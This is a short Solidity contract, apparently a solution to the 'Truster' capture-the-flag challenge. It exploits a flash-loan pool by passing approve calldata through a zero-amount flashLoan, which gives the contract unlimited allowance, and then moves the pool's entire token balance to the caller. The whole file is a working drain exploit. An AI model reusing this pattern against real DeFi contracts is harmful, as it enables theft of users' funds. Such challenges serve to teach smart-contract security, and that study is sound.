// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";
import "hardhat/console.sol";

contract AttackTruster {
    IERC20 public token;
    TrusterLenderPool public pool;

    constructor(address _tokenAddress, address _pool) {
        token = IERC20(_tokenAddress);
        pool = TrusterLenderPool(_pool);
    }

    function attack() external {
        // let pool approve this contract
        bytes memory _data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, address(this), address(token), _data);

        // transferFrom pool to this contract
        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), msg.sender, balance);
    }
}
